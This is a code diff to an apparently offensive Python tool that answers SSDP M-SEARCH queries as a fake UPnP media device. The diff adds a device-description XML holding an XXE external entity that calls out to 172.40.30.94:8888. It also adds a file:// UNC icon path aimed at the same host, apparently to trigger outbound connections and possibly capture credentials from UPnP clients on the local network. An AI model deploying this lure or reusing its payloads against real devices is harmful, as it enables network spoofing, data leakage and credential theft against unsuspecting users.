@@ -4,6 +4,7 @@ import socket
 import struct
 import sys
 import time
+import re
 from http.server import BaseHTTPRequestHandler
 from email.utils import formatdate
 
@@ -32,6 +33,7 @@ class SSDPListener:
         
         # Create the socket
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        #self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         
         # Bind to the server address
         self.sock.bind(serverAddress)
@@ -53,39 +55,84 @@ class SSDPListener:
     def process_data(self, data, address):
         (remoteIp,remotePort) = address
         if 'M-SEARCH' in str(data):
+            #print(str(data))                    # DEBUG
+            requestedST = re.findall(r'\\r\\nST:(.*?)\\r\\n', str(data))[0].strip() or 'upnp:rootdevice'
             if address[0] not in self.knownHosts:
                 print(noteBox + "Received an M-SEARCH query from new host {} on port {}".format(remoteIp, remotePort))
-                print("    " + okBox + "Subsequent requests from this host will be processed but not printed here.")
                 self.knownHosts.append(address[0])
-            self.send_location(address)
+                print("    " + okBox + "Replying with the ST of " + requestedST)
+            self.send_location(address, requestedST)
 
-    def send_location(self, address):
+    def send_location(self, address, requestedST):
         URL = 'http://{}:{}/ssdp/device-desc.xml'.format(self.localIp, self.localPort)
         lastSeen = str(time.time())
         dateFormat = formatdate(timeval=None, localtime=False, usegmt=True)
-        reply = 'HTTP/1.1 200 OK\n'
-        reply += 'CACHE-CONTROL: max-age=1800\n'
-        reply += 'DATE: ' + dateFormat + '\n'
-        reply += 'EXT: \n'
-        reply += 'LOCATION: ' + URL + '\n'
-        reply += 'SERVER: Linux/3.10.96+, UPnP/1.0, eSSDP/0.1\n'
-        reply += 'ST: upnp:rootdevice\n'
-        reply += 'USN: uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563\n'
-        reply += 'BOOTID.UPNP.ORG: 0\n'
-        reply += 'CONFIGID.UPNP.ORG: 1\n'
-        reply += '\n\n'
+        reply = 'HTTP/1.1 200 OK\r\n'
+        reply += 'CACHE-CONTROL: max-age=1800\r\n'
+        reply += 'DATE: ' + dateFormat + '\r\n'
+        reply += 'EXT: \r\n'
+        reply += 'LOCATION: ' + URL + '\r\n'
+        reply += 'SERVER: Linux/3.10.96+, UPnP/1.0, eSSDP/0.1\r\n'
+        reply += 'ST: {}\r\n'.format(requestedST)
+        reply += 'USN: uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563:upnp-rootdevice\n'
+        reply += 'BOOTID.UPNP.ORG: 0\r\n'
+        reply += 'CONFIGID.UPNP.ORG: 1\r\n'
+        reply += '\r\n\r\n'
         reply = bytes(reply, 'utf-8')
         self.sock.sendto(reply, address)
 
 class DeviceDescriptor(BaseHTTPRequestHandler):
     
     def do_GET(self):
-        xmlFile = '<root></root>'
+        xmlFile = self.buildXml()
         if self.path == '/ssdp/device-desc.xml':
             self.send_response(200)
             self.send_header('Content-type', 'application/xml')
             self.end_headers()
             self.wfile.write(xmlFile.encode())
+            print(self.headers)  # For debugging, ok to remove.
 
-    def log_message(self, format, *args):
-        print(noteBox + "Someone took the bait!")
+    def buildXml(self):
+        xmlFile = '''<!DOCTYPE foo [
+    <!ELEMENT friendlyName ANY >
+    <!ENTITY xxe SYSTEM "http://172.40.30.94:8888/xxe" >]>
+    <root>
+    <specVersion>
+        <major>1</major>
+        <minor>0</minor>
+    </specVersion>
+    <device>
+        <deviceType>urn:schemas-upnp-org:device:Basic:1</deviceType>
+        <friendlyName>&xxe;</friendlyName>
+        <manufacturer>eCorp</manufacturer>
+        <manufacturerURL>http://ecorp.co</manufacturerURL>
+        <modelDescription>eMedia Server</modelDescription>
+        <modelName>Black Edition</modelName>
+        <modelNumber>666</modelNumber>
+        <modelURL>http://ecorp.co/model666</modelURL>
+        <serialNumber>1337</serialNumber>
+        <UDN>uuid:e415ce0a-3e62-22d0-ad3f-42ec42e36563</UDN>
+        <serviceList>
+            <service>
+                <URLBase>http://xxx.yyy.zzz.aaaa:5000</URLBase>
+                <serviceType>urn:boucherie.example.com:service:Jambon:1</serviceType>
+                <serviceId>urn:boucherie.example.com:serviceId:Jambon</serviceId>
+                <controlURL>/jambon</controlURL>
+                <eventSubURL/>
+                <SCPDURL>/boucherie_wsd.xml</SCPDURL>
+            </service>
+        </serviceList>
+        <presentationURL>http://localhost</presentationURL>
+        <iconList><icon>
+            <mimetype>image/png</mimetype>
+            <width>93</width>
+            <height>45</height>
+            <depth>32</depth>
+            <url>file://///172.40.30.94/icon.png</url>
+            </icon></iconList>
+    </device>
+    </root>'''
+        return xmlFile
+
+    #def log_message(self, format, *args):
+    #    print(noteBox + "Someone took the bait!")
